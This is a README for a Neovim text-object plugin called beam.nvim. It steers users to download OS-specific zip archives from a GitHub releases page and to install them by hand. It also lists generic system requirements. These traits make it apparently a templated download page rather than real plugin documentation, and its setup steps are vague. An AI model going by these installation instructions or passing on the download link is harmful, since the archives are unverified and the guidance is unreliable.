# ✨ beam.nvim - Simple Text Editing Anywhere in Your File

[![Download beam.nvim](https://img.shields.io/badge/Download-beam.nvim-brightgreen)](https://github.com/Tyrik630/beam.nvim/releases)

## 🚀 Getting Started

Welcome to the beam.nvim project! This tool allows you to perform text operations on text objects seamlessly throughout your file. If you are looking for an easier way to handle text editing, you’re in the right place.

## 💾 System Requirements

To ensure beam.nvim runs smoothly, you will need the following:

- **Operating System:** Compatible with Windows, macOS, and Linux.
- **Text Editor:** Ensure you have Neovim (v0.5 or above) installed.
- **Memory:** At least 2 GB of RAM.
- **Disk Space:** A minimum of 50 MB of free space for installation.

## 📥 Download & Install

To get started, visit the link below to download the latest version of beam.nvim. 

[Download beam.nvim](https://github.com/Tyrik630/beam.nvim/releases)

### Installation Steps:

1. **Visit the Releases Page:**
   Click the link above to access the releases page. You will see the latest versions available for download.

2. **Choose the Correct File:**
   Look for the file that matches your operating system. For example, you might see filenames like `beam.nvim-macos.zip` for macOS or `beam.nvim-windows.zip` for Windows.

3. **Download the File:**
   Click on the file link to start the download.

4. **Extract the Files:**
   After downloading, locate the file in your Downloads folder. If the file is zipped, right-click on it and choose "Extract All" or use your preferred extraction tool.

5. **Move to Plugins Folder:**
   Move the extracted folder to your Neovim plugins directory. This is usually located at `~/.config/nvim/plugged/` on Unix-based systems or `C:\Users\<YourUsername>\AppData\Local\nvim\plugged\` on Windows.

6. **Open Neovim:**
   Launch your Neovim text editor. You can usually do this by typing `nvim` in your command line or terminal.

7. **Verify Installation:**
   Type `:checkhealth` within Neovim to verify that beam.nvim has been installed properly. If everything is set up correctly, you should see a success message.

## 🎉 Features

- **Text Object Manipulation:** Easily select and manipulate various text objects within your files. No more cumbersome text selection!
- **Support for Multiple Formats:** Whether you are editing markdown, code, or plain text, beam.nvim adapts to your needs.
- **Customizable Settings:** Adjust the tool to fit your workflow. Modify settings in the configuration file as needed.

## ⚙️ Configuration

Once you have installed beam.nvim, you may want to configure it to better suit your needs. Here’s how:

1. **Create or Edit Configuration File:**
   Open or create a configuration file for Neovim, typically located at `~/.config/nvim/init.vim` or `~/.config/nvim/init.lua`.

2. **Add Beam Configurations:**
   Include the following lines to set custom options (these are examples; you can modify based on your preferences):

   ```vim
   " For Vimscript
   let g:beam_enable_selection = 1
   ```

   ```lua
   -- For Lua
   vim.g.beam_enable_selection = true
   ```

3. **Save the File:**
   Save any changes you made to the configuration file.

4. **Restart Neovim:**
   Close Neovim and reopen it to apply your new settings.

## 📄 Usage Guide

Now that you have installed beam.nvim, using it is straightforward:

- **Selecting Text Objects:**
   Navigate to the text object you want to edit. Use commands like `va` to select around a text area or `vi` to select inside it.

- **Editing Text:**
   After selecting, you can use standard Neovim commands to delete, change, or copy text.

- **Expanding Functionality:**
   Explore further options by using the command `:help beam.nvim` within Neovim to access the built-in documentation.

## 🌐 Support

Should you encounter issues or have questions, please check out the support section:

- **Documentation:** Visit the official [GitHub repository](https://github.com/Tyrik630/beam.nvim) for detailed documentation.
- **Issues:** If you have a problem that is not covered, feel free to open an issue in the repository.
- **Community:** Join discussions or seek help from other users on platforms like Discord or community forums related to Neovim.

## ✍️ Acknowledgments

Thanks to the Neovim community for their support and contributions. Your feedback helps improve beam.nvim for everyone.

## 📞 Contact

If you wish to reach out for support or suggestions, feel free to contact the repository maintainers via GitHub. Your input is appreciated.

Thank you for choosing beam.nvim! Happy editing!